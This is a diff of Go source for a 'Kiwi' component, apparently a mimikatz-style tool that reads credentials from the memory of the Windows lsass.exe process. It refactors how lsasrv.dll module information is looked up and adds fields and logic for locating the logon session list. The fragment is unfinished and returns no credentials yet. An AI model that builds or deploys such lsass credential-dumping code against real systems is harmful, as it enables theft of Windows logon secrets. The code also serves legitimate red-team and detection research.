@@ -34,15 +34,22 @@ type Kiwi struct {
 	// 0 = not read, 1 = true, 2 = false
 	wow64 uint8
 
-	// resource about lsass.exe
-	pid     uint32
-	modules []*basicModuleInfo
+	pid uint32
 
 	// about Windows version
 	major uint32
 	minor uint32
 	build uint32
 
+	// modules about lsass.exe
+	modules    []*basicModuleInfo
+	modulesRWM sync.RWMutex
+
+	// address about logon session
+	logonSessionListAddr      uintptr
+	logonSessionListCountAddr uintptr
+
+	// lock above fields
 	mu sync.Mutex
 }
 
@@ -97,20 +104,10 @@ func (kiwi *Kiwi) GetAllCredential() ([]*Credential, error) {
 	}
 	defer api.CloseHandle(pHandle)
 	kiwi.logf(logger.Info, "process handle of lsass.exe is 0x%X", pHandle)
-	modules, err := kiwi.getLSASSBasicModuleInfo(pHandle)
-	if err != nil {
-		return nil, err
-	}
+	patch := lsaSrvX64References[buildWin10v1507]
+	kiwi.getSessionList(pHandle, patch)
 
-	for _, module := range modules {
-		if module.name == "lsasrv.dll" {
-			patch := lsaSrvX64References[buildWin10v1507]
-			kiwi.searchSessionList(pHandle, patch)
-
-			_ = kiwi.searchMemory(pHandle, module.address, module.size)
-		}
-		// fmt.Println(module.name, module.address)
-	}
+	// _ = kiwi.searchMemory(pHandle, module.address, module.size)
 	return nil, nil
 }
 
@@ -254,17 +251,21 @@ func (kiwi *Kiwi) getVeryBasicModuleInfo(pHandle windows.Handle) ([]*basicModule
 	return modules, nil
 }
 
-func (kiwi *Kiwi) getLSASSBasicModuleInfo(pHandle windows.Handle) ([]*basicModuleInfo, error) {
-	kiwi.mu.Lock()
-	defer kiwi.mu.Unlock()
-	if len(kiwi.modules) != 0 {
-		return kiwi.modules, nil
+func (kiwi *Kiwi) getLSASSBasicModuleInfo(pHandle windows.Handle, name string) (*basicModuleInfo, error) {
+	kiwi.modulesRWM.Lock()
+	defer kiwi.modulesRWM.Unlock()
+	if len(kiwi.modules) == 0 {
+		modules, err := kiwi.getVeryBasicModuleInfo(pHandle)
+		if err != nil {
+			return nil, err
+		}
+		kiwi.modules = modules
+		kiwi.log(logger.Info, "load module information about lsass.exe successfully")
 	}
-	var err error
-	kiwi.modules, err = kiwi.getVeryBasicModuleInfo(pHandle)
-	if err != nil {
-		return nil, err
+	for _, module := range kiwi.modules {
+		if module.name == name {
+			return module, nil
+		}
 	}
-	kiwi.log(logger.Info, "load module information about lsass.exe successfully")
-	return kiwi.modules, nil
+	return nil, errors.Errorf("module %s is not exist in lsass.exe", name)
 }
